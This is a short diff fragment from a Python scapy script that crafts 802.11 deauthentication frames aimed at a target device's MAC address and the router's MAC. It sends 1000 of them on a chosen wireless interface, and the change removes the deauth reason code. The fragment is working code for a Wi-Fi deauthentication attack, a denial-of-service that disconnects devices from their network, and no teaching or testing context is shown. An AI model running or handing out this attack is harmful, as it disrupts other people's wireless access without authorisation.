@@ -30,7 +30,7 @@ else:
 
     ## crafting the packet
     dot_layer = scapy.Dot11(addr1 = options.target_mac, addr2 = options.router_mac, addr3 = options.router_mac)
-    packet = scapy.RadioTap() / dot_layer / scapy.Dot11Deauth(reason=7)
+    packet = scapy.RadioTap() / dot_layer / scapy.Dot11Deauth()
 
     ## sending the packet
     scapy.sendp(packet, inter = 0.1, count = 1000, iface = options.iface, verbose = 1)
